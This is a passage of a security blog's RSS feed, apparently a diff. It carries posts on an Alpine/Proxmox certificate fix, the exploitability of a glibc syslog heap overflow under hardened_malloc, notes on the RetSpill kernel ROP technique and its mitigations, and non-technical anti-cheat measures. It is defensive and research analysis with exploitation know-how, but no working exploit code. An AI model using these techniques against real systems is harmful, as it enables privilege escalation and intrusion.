+&lt;span class="go"&gt;48AB2E51FA7F0000:error:80000002:system library:file_open:No such file or directory:providers/implementations/storemgmt/file_store.c:267:calling stat(/usr/lib/ssl/certs)&lt;/span&gt;
+&lt;span class="go"&gt;48AB2E51FA7F0000:error:0A000086:SSL routines:tls_post_process_server_certificate:certificate verify failed:ssl/statem/statem_clnt.c:1889:&lt;/span&gt;
+&lt;span class="go"&gt;WARNING: updating and opening https://dl-cdn.alpinelinux.org/alpine/v3.18/community: Permission denied&lt;/span&gt;
+&lt;span class="go"&gt;4 unavailable, 0 stale; 30 distinct packages available&lt;/span&gt;
+&lt;span class="gp"&gt;# &lt;/span&gt;^D
+&lt;span class="go"&gt;root@pve ~ lxc-attach -n 122 &lt;/span&gt;
+&lt;span class="gp"&gt;# &lt;/span&gt;apk&lt;span class="w"&gt; &lt;/span&gt;update&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;apk&lt;span class="w"&gt; &lt;/span&gt;upgrade
+&lt;span class="go"&gt;fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/main/x86_64/APKINDEX.tar.gz&lt;/span&gt;
+&lt;span class="go"&gt;fetch https://dl-cdn.alpinelinux.org/alpine/v3.18/community/x86_64/APKINDEX.tar.gz&lt;/span&gt;
+&lt;span class="go"&gt;v3.18.6-10-g1bb71e18dfb [https://dl-cdn.alpinelinux.org/alpine/v3.18/main]&lt;/span&gt;
+&lt;span class="go"&gt;v3.18.6-9-g41de282e84d [https://dl-cdn.alpinelinux.org/alpine/v3.18/community]&lt;/span&gt;
+&lt;span class="go"&gt;OK: 20069 distinct packages available&lt;/span&gt;
+&lt;span class="go"&gt;OK: 10 MiB in 30 packages&lt;/span&gt;
+&lt;span class="gp"&gt;# &lt;/span&gt;^D
+&lt;span class="go"&gt;root@pve 16:58 ~ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;tl;dr: &lt;code&gt;lxc attach -n 123&lt;/code&gt; instead of &lt;code&gt;pct enter 123&lt;/code&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Mon, 05 Feb 2024 17:00:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2024-02-05:/b/fixing-the-usrlibsslcerts-debacle-with-alpine-linux-on-proxmox.html</guid><category>sysadmin</category></item><item><title>Musings on CVE-2023-6246 on hardened_malloc</title><link>https://dustri.org/b/musings-on-cve-2023-6246-on-hardened_malloc.html</link><description>&lt;p&gt;Qualys' &lt;s&gt;security team&lt;/s&gt; Threat Research Unit &lt;a href="https://seclists.org/oss-sec/2024/q1/68"&gt;published&lt;/a&gt;
+a couple of hours ago a linear two-step heap buffer overflow in glibc's
+&lt;code&gt;syslog()&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="mi"&gt;206&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;malloc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;bufsize&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;span class="p"&gt;...&lt;/span&gt;
+&lt;span class="mi"&gt;213&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;__snprintf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="mi"&gt;214&lt;/span&gt;&lt;span class="w"&gt;                   &lt;/span&gt;&lt;span class="n"&gt;SYSLOG_HEADER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pri&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;timestamp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;msgoff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;span class="p"&gt;...&lt;/span&gt;
+&lt;span class="mi"&gt;221&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="n"&gt;__vsnprintf_internal&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bufsize&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;apc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;span class="mi"&gt;222&lt;/span&gt;&lt;span class="w"&gt;                           &lt;/span&gt;&lt;span class="n"&gt;mode_flags&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;the tl;dr is that &lt;code&gt;bufsize&lt;/code&gt; is &lt;code&gt;0&lt;/code&gt; while &lt;code&gt;l&lt;/code&gt; is user-controlled.
+As mentioned in the advisory, messing with nss structures as done
+in their (phenomenal) &lt;a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt"&gt;&lt;code&gt;Baron Samedit&lt;/code&gt; sudo
+exploit&lt;/a&gt;
+is a good way to get a root shell on the glibc.&lt;/p&gt;
+&lt;p&gt;While the bug is in glibc's &lt;code&gt;syslog&lt;/code&gt;, it's not unheard of for
+people to run custom allocators for performance/security/speed/… reasons.
+One of those could be, for example, &lt;a href="https://github.com/GrapheneOS/hardened_malloc"&gt;hardened_malloc&lt;/a&gt;,
+&lt;a href="https://grapheneos.org"&gt;GrapheneOS&lt;/a&gt;'s security-focused allocator, raising
+the question "would &lt;code&gt;hardened_malloc&lt;/code&gt; make this particular bug
+unexploitable on my x86_64 Debian machine?"&lt;/p&gt;
+&lt;p&gt;After discussing this with friends, we don't &lt;em&gt;think&lt;/em&gt; that it makes
+the bug completely unexploitable, but ridiculously complicated, which is good
+enough™ for me. But keep in mind that this "analysis" was done hastily at 2am,
+so caveat lector.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hardened_malloc&lt;/code&gt; uses size-based slabs isolation, popularised by
+&lt;a href="https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md"&gt;PartitionAlloc&lt;/a&gt;.
+Since &lt;code&gt;bufsize&lt;/code&gt; is zero, this is a 1-byte
+allocation, falling into the
+&lt;a href="https://github.com/GrapheneOS/hardened_malloc/blob/main/h_malloc.c#L147"&gt;16 bytes size-class&lt;/a&gt;,
+the smallest after the special &lt;code&gt;0&lt;/code&gt; one. So to exploit this, one would have to find an
+interesting object of size 16 bytes or lower to overwrite. But since
+canaries are enabled by default, this becomes even more difficult: sizes of
+allocations are actually bumped by 8 bytes, meaning that one would actually
+have to find an interesting object of size 8 bytes or lower.&lt;/p&gt;
+&lt;p&gt;Moreover, 16-byte slabs can contain at most 256 allocations, and are
+surrounded by guard pages, meaning that accessing anything below &lt;code&gt;buf&lt;/code&gt; and
+above &lt;code&gt;buf+(256*16)&lt;/code&gt; will result in a crash.&lt;/p&gt;
+&lt;p&gt;Allocations are randomized, which might help for bruteforcing the heap layout:
+if the current one isn't exploitable, just crash and start again. But it will
+also result in a lot more crashes, since &lt;code&gt;buf&lt;/code&gt; might be allocated closer to
+the guard page.&lt;/p&gt;
+&lt;p&gt;There are of course other mitigations, but they aren't relevant in this
+particular case, like canaries that are checked on &lt;code&gt;free&lt;/code&gt;,
+or &lt;a href="https://community.arm.com/arm-community-blogs/b/architectures-and-processors-blog/posts/enhanced-security-through-mte"&gt;ARM's MTE&lt;/a&gt; that completely kills linear-overflows.&lt;/p&gt;
+&lt;p&gt;Given the ludicrous amount of randomization &lt;code&gt;hardened_malloc&lt;/code&gt; applies to heap bases (32G
+per region), bruteforcing offsets of anything not on the heap is futile.
+So one would have to find something interesting in an object of 8 bytes or less on
+the heap, like a path to corrupt as in &lt;code&gt;service_user&lt;/code&gt;,
+or some partial-overwrite of a function-pointer to call a
+&lt;a href="https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html"&gt;one-shot-gadget&lt;/a&gt;, …&lt;/p&gt;
+&lt;p&gt;Thanks to &lt;code&gt;strcat&lt;/code&gt; for the handholding, and
+to &lt;code&gt;jdoe&lt;/code&gt;, &lt;code&gt;drvink&lt;/code&gt; and &lt;code&gt;J&lt;/code&gt; for their diligent proofreading,&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Wed, 31 Jan 2024 02:00:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2024-01-31:/b/musings-on-cve-2023-6246-on-hardened_malloc.html</guid><category>security</category></item><item><title>Paper notes: RetSpill</title><link>https://dustri.org/b/paper-notes-retspill.html</link><description>&lt;ul&gt;
+&lt;li&gt;Full title: RetSpill: Igniting User-Controlled Data to Burn Away Linux Kernel Protections&lt;/li&gt;
+&lt;li&gt;PDF: &lt;a href="https://dl.acm.org/doi/10.1145/3576915.3623220"&gt;ACM&lt;/a&gt; —
+  &lt;a href="https://kylebot.net/papers/retspill.pdf"&gt;mirror&lt;/a&gt; —
+  &lt;a href="https://dustri.org/b/files/papers/retspill.pdf"&gt;local mirror&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Authors: &lt;a href="https://kylebot.net/"&gt;Kyle "kylebot" Zeng&lt;/a&gt;,
+  &lt;a href="https://ruoyuwang.me/"&gt;Ruoyu Wang&lt;/a&gt;,
+  &lt;a href="https://yancomm.net/"&gt;Yan Shoshitaishvili&lt;/a&gt;,
+  and &lt;a href="https://adamdoupe.com/"&gt;Adam Doupé&lt;/a&gt; from &lt;a href="https://shellphish.net/"&gt;Shellphish&lt;/a&gt;,
+  along with &lt;a href="https://zplin.me/"&gt;Zhenpeng Lin&lt;/a&gt;,
+  &lt;a href="https://www-users.cse.umn.edu/~kjlu/"&gt;Kangjie Lu&lt;/a&gt;,
+  &lt;a href="http://xinyuxing.org/"&gt;Xinyu Xing&lt;/a&gt; and
+  &lt;a href="https://www.tiffanybao.com/"&gt;Tiffany Bao&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The idea of the paper is to use user-controlled data that are by design copied
+in kernel-land when exercising syscalls to store a &lt;a href="https://en.wikipedia.org/wiki/Return-oriented_programming"&gt;ROP&lt;/a&gt;-chain, via 4 main venues:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Valid Data directly copied onto the kernel stack for performance reasons, like when
+  calling &lt;code&gt;poll&lt;/code&gt;;&lt;/li&gt;
+&lt;li&gt;Preserved Registers, restored upon returning from kernel-land to
+  userland. &lt;/li&gt;
+&lt;li&gt;Calling Convention compliant functions will save/restore registers, and
+  apparently, system call handlers are calling convention compliant
+  even though the kernel is already taking care of those,
+  and syscalls can &lt;a href="https://www.kernel.org/doc/html/latest/process/adding-syscalls.html?highlight=syscall_define#do-not-call-system-calls-in-the-kernel"&gt;only be called from userland&lt;/a&gt;.
+  But even if the syscalls handles weren't compliant, registers still contain
+  userland values when they're called, and sub-functions might store/restore
+  those registers, since those do need to be compliant.&lt;/li&gt;
+&lt;li&gt;Uninitialized Memory, since the per-thread kernel stack is reused between syscalls,
+  and not erased (unless &lt;code&gt;PAX_MEMORY_STACKLEAK&lt;/code&gt; is used).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Then, only a &lt;a href="https://en.wikipedia.org/wiki/KASLR"&gt;KASLR&lt;/a&gt; leak,
+a CFHP (control-flow hijacking primitive)
+and a &lt;code&gt;add rsp, X; ret&lt;/code&gt;-like gadget are required to &lt;a href="https://www.youtube.com/watch?v=FoUWHfh733Y"&gt;ROP all the things&lt;/a&gt;.
+Nowadays, most™ CFHP are created by corrupting the heap to hijack function
+pointers, and since every kernel thread shares the same heap,
+once it is is properly shaped, the control flow hijacking primitive can likely
+be triggered again and again from a different threads.
+Moreover, changing the exploit is simply a matter of re-invoking a syscall with
+different data spill, instead of having to reshape the heap every single time.
+One doesn't have to worry about crashes (enabling lame bruteforcing), since no
+major Linux distributions (except CentOS, kudos) has &lt;code&gt;panic_on_oops&lt;/code&gt; enabled,
+so having a ROP-chain crash is no big deal, because the CFHP is still on the
+heap, one syscall away.&lt;/p&gt;
+&lt;p&gt;Since the space afforded to store gadgets might be too small, one trick is to
+invoke &lt;code&gt;do_task_dead&lt;/code&gt; at the end of every ROP-chain to terminate it gracefully,
+and trigger the CFHP again and again.&lt;/p&gt;
+&lt;p&gt;Mitigation-wise: &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Control_register#SMEP"&gt;SMEP&lt;/a&gt;, 
+  &lt;a href="https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention"&gt;SMAP&lt;/a&gt; and
+  &lt;a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation"&gt;KPTI&lt;/a&gt; are irrelevant.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://pax.grsecurity.net/docs/randkstack.txt"&gt;RANDKSTACK&lt;/a&gt; mitigates data spillage from Preserved Registers and Uninitialized Memory,
+  but since it only provides 5 bits of randomness, a &lt;code&gt;ret&lt;/code&gt;-sled is enough
+  to bypass it (25.44% of the time if using gadgets from Preserved Registers or Uninitialized Memory, 100% otherwise),
+  and in the absence of &lt;code&gt;panic_on_oops&lt;/code&gt; it can quickly be bruteforced anyway.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options#Sanitize_kernel_stack"&gt;STACKLEAK&lt;/a&gt;,
+  &lt;a href="https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options#Forcibly_initialize_local_variables_copied_to_userland"&gt;STRUCTLEAK&lt;/a&gt;,
+  and &lt;a href="https://lwn.net/Articles/823152/"&gt;CONFIG_INIT_STACK_*&lt;/a&gt;
+  only mitigate data spillage from Uninitialized Memory.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://lwn.net/Articles/824307/"&gt;FG-KASLR&lt;/a&gt; is &lt;a href="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/#gathering-useful-gadgets"&gt;useless&lt;/a&gt;
+  since it doesn't randomize everything, leaving a couple (&lt;code&gt;42631&lt;/code&gt; according to
+  the paper) of gadgets at position-invariant positions, which are enough to perform
+  arbitrary-reads and derandomize everything.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://lore.kernel.org/lkml/202210010918.4918F847C4@keescook/T/#u"&gt;KCFI&lt;/a&gt;
+  and &lt;a href="https://www.intel.com/content/www/us/en/developer/articles/technical/technical-look-control-flow-enforcement-technology.html"&gt;IBT&lt;/a&gt;
+  also (currently) don't cover everything, but don't really matter much here
+  anyway, since we only care about backward-edges, and as for the CFHP:&lt;/li&gt;
+&lt;li&gt;There &lt;a href="https://i.blackhat.com/USA-22/Wednesday/US-22-Jin-Monitoring-Surveillance-Vendors.pdf#page=35"&gt;are ways&lt;/a&gt;
+    to obtain one in the presence of perfect forward-edge CFI with a heap corruption.&lt;/li&gt;
+&lt;li&gt;Using &lt;code&gt;__x86_indirect_thunk_rdi&lt;/code&gt; allows to transform a forward-edge control-flow transition to backward edge one.&lt;/li&gt;
+&lt;li&gt;Shadow stack and perfect CFI are a pipe dream that would mitigate RetSpill,
+  but &lt;a href="https://pax.grsecurity.net/docs/PaXTeam-H2HC15-RAP-RIP-ROP.pdf"&gt;PaX' RAP&lt;/a&gt;
+  is really close to it, likely making it insanely hard, with its type-based
+  CFI, and its changing-on-every-syscall/task/… register-stored cookie paired
+  with unreadable kernel stacks for backward edge, on top of CFI.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To showcase how cool all of this is, the paper comes with a semi-automated tool
+outputting the address of a stack-shifting gadget, a function to performs data
+spillage, invoke the triggering system call, and yield a root shell via a
+classic &lt;code&gt;commit_creds(init_cred)&lt;/code&gt; + returning back to user space. It works by:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;taking full snapshots of a vm to locate the syscall leading to CFHP by using
+  a binary-search-like heuristic;&lt;/li&gt;
+&lt;li&gt;mutating userland inputs (registers, &lt;code&gt;copy\_from\_user&lt;/code&gt;/&lt;code&gt;get\_user&lt;/code&gt;
+  parameters, …), continuing the execution of the vm,
+  marking the as user-controllable data if the CFHP still
+  happens after modifications, and doing taint analysis to find how to modify
+  them.&lt;/li&gt;
+&lt;li&gt;generating a ROP-chain, which isn't that easy, given that:&lt;/li&gt;
+&lt;li&gt;it's done over discrete controlled regions&lt;/li&gt;
+&lt;li&gt;there are some constraints, like "&lt;code&gt;eax&lt;/code&gt; contains the syscall number",
+    or "&lt;code&gt;edx&lt;/code&gt; comes from both &lt;em&gt;Saved Registers&lt;/em&gt; and &lt;em&gt;Calling Convention&lt;/em&gt;
+    spillages.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Of course, given that some authors are &lt;a href="https://angr.io/"&gt;angr&lt;/a&gt; developers,
+&lt;a href="https://github.com/angr/angrop"&gt;angrop&lt;/a&gt; was used to knit the ROP-chains, and
+the results are pretty impressive:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The abundance of data spillage allows 20 out of 22 proof-of-concept programs
+that manifest CFHP to be semi-automatically turned into full privilege escalation exploits.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;To kill this technique, the authors suggest:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;em&gt;Preserved Register&lt;/em&gt;: &lt;code&gt;RANDKSTACK&lt;/code&gt; helps, but storing userspace registers
+   somewhere else than on the stack would be even better, eg. in &lt;code&gt;task_struct&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;Uninitialized Memory&lt;/em&gt;: enable &lt;code&gt;STACKLEAK&lt;/code&gt;/&lt;code&gt;STRUCTLEAK&lt;/code&gt;/&lt;code&gt;CONFIG\_INIT\_STACK\_\*&lt;/code&gt;,
+   but the performances impact is pretty steep.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;Calling Convention&lt;/em&gt; and &lt;em&gt;Valid Data&lt;/em&gt;: an improved version of &lt;code&gt;RANDKSTACK&lt;/code&gt;,
+   adding a random offset at the bottom of each stack frame, between &lt;code&gt;rsp&lt;/code&gt; and user data.
+   This technique also mitigates Preserved Registers and Uninitialized Memory,
+   with an average performance overhead of 0.61%.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Like all good papers it comes &lt;a href="https://github.com/sefcom/RetSpill"&gt;with code&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Amusingly:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;RetSpill completely bypasses OpenBSD's
+  &lt;a href="https://isopenbsdsecu.re/mitigations/map_stack/"&gt;MAP_STACK&lt;/a&gt; mitigation,
+  should it ever be implemented in kernel-land, &lt;/li&gt;
+&lt;li&gt;The &lt;a href="https://org.anize.rs/"&gt;Organizers&lt;/a&gt; CTF team
+  &lt;a href="https://org.anize.rs/0CTF-2021-finals/pwn/kernote"&gt;used&lt;/a&gt;
+  the &lt;a href="https://elixir.bootlin.com/linux/latest/ident/pt_regs"&gt;&lt;code&gt;ptregs&lt;/code&gt;&lt;/a&gt; structure
+  to store their ROP chain for &lt;a href="https://ctftime.org/event/1357"&gt;0CTF/TCTF 2021
+  Finals&lt;/a&gt;'s
+  &lt;a href="https://ctftime.org/task/17461"&gt;Kernote&lt;/a&gt; pwn challenge.&lt;/li&gt;
+&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Thu, 18 Jan 2024 16:45:00 +0100</pubDate><guid isPermaLink="false">tag:dustri.org,2024-01-18:/b/paper-notes-retspill.html</guid><category>paper_notes</category></item><item><title>On non-technical video-games cheat mitigations</title><link>https://dustri.org/b/on-non-technical-video-games-cheat-mitigations.html</link><description>&lt;p&gt;Cheats are as old as video games, and will be there as long. There
+are a couple of high-profile players in the anti-cheat market today:
+&lt;a href="https://en.wikipedia.org/wiki/BattlEye"&gt;BattlEye&lt;/a&gt;,
+&lt;a href="https://en.wikipedia.org/wiki/Valve_Anti-Cheat"&gt;Valve's VAC&lt;/a&gt;,
+&lt;a href="https://en.wikipedia.org/wiki/PunkBuster"&gt;PunkBuster&lt;/a&gt;,
+&lt;a href="https://easy.ac/en-us/"&gt;Epic's EAC&lt;/a&gt;,
+&lt;a href="https://wowpedia.fandom.com/wiki/Warden_(software)"&gt;Blizzard's Warden&lt;/a&gt;,
+&lt;a href="https://support-valorant.riotgames.com/hc/en-us/articles/360046160933-What-is-Vanguard-"&gt;Riot's Vanguard&lt;/a&gt;,
+&lt;a href="https://callofduty.com/en/warzone/ricochet"&gt;Activision's Ricochet&lt;/a&gt;,
+… as well as in-house ones.&lt;/p&gt;
+&lt;p&gt;To try to keep up in the race, both sides are resorting to more and more invasive
+technical privacy-invasive measures: streaming virtualised shellcodes,
+hardware fingerprinting and locking,
+&lt;a href="https://secret.club/2020/01/05/battleye-stack-walking.html"&gt;stack-walking&lt;/a&gt;,
+bootkit-like kernel drivers,
+&lt;a href="https://en.wikipedia.org/wiki/Trusted_Platform_Module"&gt;TPM&lt;/a&gt;/
+secure boot/
+&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/bringup/device-guard-and-credential-guard"&gt;HVCI&lt;/a&gt;/
+&lt;a href="https://en.wikipedia.org/wiki/Input%E2%80%93output_memory_management_unit"&gt;IOMMU&lt;/a&gt;/
+&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs"&gt;VBS&lt;/a&gt;/…
+&lt;a href="https://support-valorant.riotgames.com/hc/en-us/articles/22291331362067-Vanguard-Restrictions"&gt;shenanigans&lt;/a&gt;,
+hypervisors &lt;a href="https://secret.club/2020/04/13/how-anti-cheats-detect-system-emulation.html"&gt;detection&lt;/a&gt;/usage,
+&lt;a href="https://secret.club/2020/03/31/battleye-developer-tracking.html"&gt;exfiltration of suspicious materials&lt;/a&gt;,
+external &lt;a href="https://en.wikipedia.org/wiki/Direct_memory_access"&gt;DMA&lt;/a&gt; hardware,
+or other &lt;a href="https://dustri.org/b/paper-notes-reversing-anti-cheats-detection-generation-cycle-with-configurable-hallucinations.html"&gt;more exotic things&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Yet anti-cheats are still routinely bypassed, less in a public manner, granted, but private
+and closed-community cheats are still flourishing, since it's a losing game by
+nature. And since games and anti-cheats are software, they're of course riddled
+with &lt;a href="https://vice.com/en/article/d7y5wj/street-fighter-v-rootkit"&gt;hilarious&lt;/a&gt; bugs leading to
+&lt;a href="https://unknowncheats.me/forum/anti-cheat-bypass/614682-eac-dll-loading-method-eac-forcer.html"&gt;stupid&lt;/a&gt;
+&lt;a href="https://unknowncheats.me/forum/anti-cheat-bypass/503052-easy-anti-cheat-kernel-packet-fucker.html"&gt;bypasses&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;But this isn't what this blogpost is about. Nowadays, cheats are considered as
+part of a larger problem: abuses and toxicity. Cheats aren't (only) hunted down
+because they're morally questionable, but because they disturb the way the game is meant to be
+enjoyed. Toxic and abusive behaviours lead to the very same results:
+A game that isn't fun to play because of cheating/abuse/toxicity issues will see its
+players number decrease, have poor reviews, … and won't make money. I'm sure
+there is a parallel to be made about the current state of our society, but I
+digress.&lt;/p&gt;
+&lt;p&gt;For this article, we'll consider cheating and abuse/toxicity
+as a single issue under the term &lt;em&gt;abuse&lt;/em&gt;.
+Now, because abuse isn't a purely technical issue, but also a social one, it
+can't be solved by technical solutions only, so let's have
+a look at what non-technical mitigations game developers are
+coming up with to curb this issue.&lt;/p&gt;
+&lt;p&gt;The most obvious mitigation is to make cheating expensive, money wise.
+Having to pay 60EUR for a game is a steep investment, especially if one 
+has to buy it again every time they get banned. This of course doesn't
+apply for free-to-play games, but can be emulated by having a cosmetics
+ecosystem, either to pay for, or to grind. The other expensive thing when
+playing video games is the hardware, and bans can be tied to it.&lt;/p&gt;
+&lt;h2&gt;Global measures&lt;/h2&gt;
+&lt;p&gt;The &lt;em&gt;big&lt;/em&gt; mitigation at this level is reputation systems. They're based on
+people who know best how a fun and fair game should go: players. After a
+match, they're encouraged to cast votes on how fair it was, on a match level,
+but also directly at players level: "Bob was really looking out for others",
+"Bob was a team player", and so on. For negative behaviour, reports don't have
+to wait the end of the match, players can report
+cheating, being offensive in the text/voice chat, &lt;a href="https://en.wikipedia.org/wiki/Griefer"&gt;griefing&lt;/a&gt;,
+queue dodging, &lt;a href="https://www.urbandictionary.com/define.php?term=smurfing"&gt;smurfing&lt;/a&gt;, … 
+Of course, slanderous reports are penalised.&lt;/p&gt;
+&lt;p&gt;Peer pressure is a good lever too, by taking action not only against cheaters,
+but from people benefiting from the cheat, like regular teammates.&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/Bug_bounty_program"&gt;Bug bounty programs&lt;/a&gt; are now commonplace,
+so it's only logical that there are now &lt;a href="https://hackerone.com/riot"&gt;some&lt;/a&gt;
+rewarding anti-cheat bypasses/exploits. The rewards are a bit cheap for now,
+but will likely rise up as the programs mature. The positive effects are
+multiples:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;It increases the incentives to report issues to get them fixed: a player
+   finding a glitch/exploit can now get some cash for the discovery&lt;/li&gt;
+&lt;li&gt;As more abuse vectors are killed, the reward prices will rise, and it might
+   become more profitable to report bugs than to sell them to cheat providers.
+   This isn't unheard of, with &lt;a href="https://google.github.io/security-research/kernelctf/rules.html"&gt;Google's
+   kernelCTF&lt;/a&gt;
+   paying two times more than Zerodium.&lt;/li&gt;
+&lt;li&gt;If the bug bounty program is correctly managed, the probability of getting a
+   given amount of money for reporting an issue will be higher than using it in
+   a cheat for an unknown period of time until it gets fixed.&lt;/li&gt;
+&lt;li&gt;It will likely increase the amount of people looking for issues and willing
+   to report them.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Community managers can also regularly &lt;s&gt;spread &lt;a href="https://en.wikipedia.org/wiki/Fear,_uncertainty,_and_doubt"&gt;FUD&lt;/a&gt;&lt;/s&gt;
+post updates about ban waves, anti-cheat measures, reports, … to make it
+clear that abusive behaviours are something being taken care of,
+and a dangerous gamble for players to take part in. I think
+I have seen some people spending time proving that some cheaters streaming live
+were in fact recycled pre-recorded footage from an earlier version of game,
+because some of the game details have been updated in the meantime.&lt;/p&gt;
+&lt;h2&gt;Accounts-level measures&lt;/h2&gt;
+&lt;p&gt;Some game stores, like &lt;a href="https://en.wikipedia.org/wiki/Steam_(service)"&gt;Steam&lt;/a&gt;,
+have an account-level "cheater" mark, meaning that if someone gets banned from a game for cheating,
+other games can know about it. But more importantly,
+&lt;a href="https://en.wikipedia.org/wiki/Achievement_(video_games)"&gt;achievements&lt;/a&gt;
+and cosmetics are also tied to an account, and as mentioned previously,
+those are non-zero time and/or money investments. Getting banned means losing
